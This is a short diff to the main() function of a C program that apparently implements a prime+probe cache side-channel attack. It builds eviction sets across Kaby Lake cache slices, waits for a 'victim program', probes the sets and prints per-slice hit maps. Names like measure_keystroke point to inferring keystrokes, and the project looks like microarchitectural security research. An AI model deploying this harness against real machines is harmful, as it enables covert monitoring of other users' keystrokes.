@@ -223,19 +223,36 @@ void measure_keystroke_without_slice(int threshold) {
 }
 
 int main() {
-  // test_eviction_set();
-  // test_covert_channel();
-  // test_eviction_and_pp();
-  // signal(SIGINT, handle_sigint);
-  // int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
+
   init_mapping();
-  // uint64_t *timestamp_sizes = profile_slices(set);
-  // uint64_t slice_zero_times[timestamp_sizes[0]];
-  // printf("%lu\n", timestamp_sizes[0]);
-  // read_binary("output0.bin", slice_zero_times, timestamp_sizes[0]);
-  // free(timestamp_sizes);
+
+  uint8_t probemap[KABYLAKE_NUM_SLICES][512 * 512];
+  uint64_t keystrokes[10][10];
+  int threshold = threshold_from_flush(mapping_start);
+
   es_list = get_all_slices_eviction_sets(mapping_start, 428);
-  measure_keystroke(threshold_from_flush(mapping_start));
+  printf("eviction set found, please start the victim program\n");
+  sleep(5);
+
+  uint64_t *hit_count = prime_probe_many_sets(
+      es_list, KABYLAKE_NUM_SLICES, KABYLAKE_ASSOCIATIVITY, 512 * 512, probemap,
+      10 * 10, keystrokes, threshold);
+  free(hit_count);
+
+  for (int i = 0; i < 8; i++) {
+    printf("--------------------------------------- slice %d "
+           "------------------------------\n",
+           i);
+    for (int j = 0; j < 64; j++) {
+      for (int k = 0; k < 64; k++) {
+        printf("%d ", probemap[i][512 * 512 - 64 * 64 + j * 64 + k]);
+      }
+      printf("\n");
+    }
+    printf("\n");
+  }
+
+  // measure_keystroke(threshold_from_flush(mapping_start));
   free_es_list(es_list);
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
   return 0;
